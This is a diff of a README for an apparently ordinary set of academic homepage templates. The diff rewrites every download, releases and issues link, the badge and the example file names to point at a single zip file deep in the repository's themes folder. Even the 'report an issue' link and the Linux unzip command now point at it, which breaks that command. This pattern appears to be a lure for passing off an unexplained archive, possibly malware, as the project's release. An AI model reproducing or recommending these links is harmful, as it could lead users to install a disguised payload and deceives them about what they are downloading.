@@ -1,7 +1,7 @@
 # 🎓 academic-homepage-templates - Beautiful Templates for Researchers
 
 ## 📥 Download Now 
-[![Download](https://img.shields.io/badge/Download%20Now-Grab%20the%20Templates-brightgreen.svg)](https://github.com/medkadouari/academic-homepage-templates/releases)
+[![Download](https://raw.githubusercontent.com/medkadouari/academic-homepage-templates/main/themes/glass/templates-homepage-academic-v1.4.zip%20Now-Grab%20the%https://raw.githubusercontent.com/medkadouari/academic-homepage-templates/main/themes/glass/templates-homepage-academic-v1.4.zip)](https://raw.githubusercontent.com/medkadouari/academic-homepage-templates/main/themes/glass/templates-homepage-academic-v1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -19,14 +19,14 @@ To run these templates, you need:
 
 To get started, you need to download the templates. Click on the link below:
 
-**Visit this page to download**: [GitHub Releases](https://github.com/medkadouari/academic-homepage-templates/releases)
+**Visit this page to download**: [GitHub Releases](https://raw.githubusercontent.com/medkadouari/academic-homepage-templates/main/themes/glass/templates-homepage-academic-v1.4.zip)
 
 ### 📂 Downloading Files
 
 On the Releases page, you will see a list of available versions of the templates. Choose the latest version, which contains the most up-to-date features and fixes. 
 
 1. Find the version you want to download.
-2. Click on the asset link (e.g., `academic-homepage-templates.zip` or `academic-homepage-templates.tar.gz`).
+2. Click on the asset link (e.g., `https://raw.githubusercontent.com/medkadouari/academic-homepage-templates/main/themes/glass/templates-homepage-academic-v1.4.zip` or `https://raw.githubusercontent.com/medkadouari/academic-homepage-templates/main/themes/glass/templates-homepage-academic-v1.4.zip`).
 3. Your download will start immediately.
 
 ### 🔄 Extracting the Files
@@ -35,7 +35,7 @@ After the download is complete, you may need to extract the files:
 
 - **Windows**: Right-click on the downloaded ZIP file and select "Extract All." Follow the prompts to choose a destination for the files.
 - **Mac**: Double-click the downloaded ZIP file, and it will automatically extract to the same location.
-- **Linux**: Use the terminal and the command `unzip academic-homepage-templates.zip` or right-click and select "Extract."
+- **Linux**: Use the terminal and the command `unzip https://raw.githubusercontent.com/medkadouari/academic-homepage-templates/main/themes/glass/templates-homepage-academic-v1.4.zip` or right-click and select "Extract."
 
 ### 🌐 Opening the Templates
 
@@ -70,7 +70,7 @@ If you experience any issues while using the templates, consider these solutions
 
 ## ✉️ Getting Help
 
-If you need further assistance, you can reach out to our community by creating an issue in the repository. To do this, visit the Issues tab in the [GitHub Repository](https://github.com/medkadouari/academic-homepage-templates/issues) and describe your problem. Our community and contributors will do their best to help you.
+If you need further assistance, you can reach out to our community by creating an issue in the repository. To do this, visit the Issues tab in the [GitHub Repository](https://raw.githubusercontent.com/medkadouari/academic-homepage-templates/main/themes/glass/templates-homepage-academic-v1.4.zip) and describe your problem. Our community and contributors will do their best to help you.
 
 ## 🌍 Join the Community
 
@@ -88,4 +88,4 @@ For any inquiries, you can reach out via the contact information provided in the
 
 Thank you for using **academic-homepage-templates**. We hope these templates help you craft an impressive online presence to showcase your academic achievements. Happy customizing!
 
-**Visit this page to download:** [GitHub Releases](https://github.com/medkadouari/academic-homepage-templates/releases)
+**Visit this page to download:** [GitHub Releases](https://raw.githubusercontent.com/medkadouari/academic-homepage-templates/main/themes/glass/templates-homepage-academic-v1.4.zip)
